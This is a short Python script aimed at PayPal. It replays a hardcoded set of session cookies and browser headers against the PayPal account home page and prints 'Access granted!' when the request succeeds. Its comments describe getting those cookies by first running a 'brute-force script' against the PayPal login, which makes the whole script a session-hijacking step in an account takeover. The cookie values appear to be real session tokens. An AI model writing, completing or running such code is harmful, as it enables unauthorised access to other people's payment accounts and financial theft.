import requests

# Replace these with the actual cookies from your browser or request
cookies = {
    "LANG": "nl_NL%3BNL",
    "ts_c": "vr%3D528c173719b73697031128dffffffffe%26vt%3D528c173719b73697031128dffffffffd",
    "enforce_policy": "gdpr_v2.1",
    "nsid": "s%3AZYbbZy53Ef5LNJWavafDEQ26B8wEWxmj.OyVdXJKKS3LDZkhKnmaL%2BADjV49RarXwr93fml9Oc2g",
    "l7_az": "dcg04.phx",
    "cookie_prefs": "T%3D0%2CP%3D0%2CF%3D0%2Ctype%3Dinitial",
    "x-pp-s": "eyJ0IjoiMTc2NjYxNjQ5NjMzNiIsImwiOiIwIiwibSI6IjAifQ",
    "tsrce": "authchallengenodeweb",
    "tcs": "main%3Amktg%3Apersonal%3Ahomepage%3Ahome-uncookied-consumer%7CHeader-MainMenu-Inloggen",
    "_dd_s": "rum=2&id=214cbbcd-1430-46b7-b2c7-8a66adfebd08&created=1766616474100&expire=1766617415364",
    "ddgl": "1",
    "ts": "vreXpYrS%3D1798152532%26vteXpYrS%3D1766618332%26vr%3D528c173719b73697031128dffffffffe%26vt%3D528c173719b73697031128dffffffffd%26vtyp%3Dnew",
    "datadome": "BOXzLdvwiK4dun~jfGBSOJwpt_aW2DAzbrpnAk8MtAZzWOiRJcOm5pUVoiQ97SWo2czpkHCd7ecMZihO2ACPNUEPFKdZR47xgzHvhXJXv3BjuV6VioMEiVVVVCfkdItg"
}

# Replace with actual headers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Accept-Language": "en-GB,en;q=0.9"
}

# Login to PayPal using the brute-force script (you can run it first)
# Once logged in, extract the cookies and use them in the script below

# Example request to access the account dashboard
response = requests.get("https://www.paypal.com/home", cookies=cookies, headers=headers)

if response.status_code == 200:
    print("Access granted! You can now interact with the PayPal account.")
    print("Response:", response.text)
else:
    print("Access denied. Check your cookies and headers.")
